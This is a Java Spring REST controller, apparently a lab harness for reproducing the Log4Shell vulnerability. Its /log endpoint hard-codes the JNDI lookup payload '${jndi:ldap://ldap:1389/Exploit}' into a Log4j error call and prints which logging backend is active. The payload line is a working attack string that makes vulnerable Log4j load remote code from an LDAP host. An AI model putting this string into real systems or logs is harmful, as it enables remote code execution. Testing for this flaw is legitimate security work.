package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;

@RestController
public class LogController {
    private static final Logger logger = LogManager.getLogger(LogController.class);

    @GetMapping("/log")
    public String logInput(@RequestParam String input) {
        
        //Hard coding the exploit so there is no funny business
        logger.error("${jndi:ldap://ldap:1389/Exploit}");

        // Print logger implementation class
        System.out.println("Logger class: " + logger.getClass().getName());

        // Check what logging backend is actually active at runtime
        try {
            org.slf4j.ILoggerFactory loggerFactory = org.slf4j.LoggerFactory.getILoggerFactory();
            System.out.println("LoggerFactory class: " + loggerFactory.getClass().getName());
        } catch (Exception e) {
            e.printStackTrace();
        }

        return "Logged: " + input;
    }

}
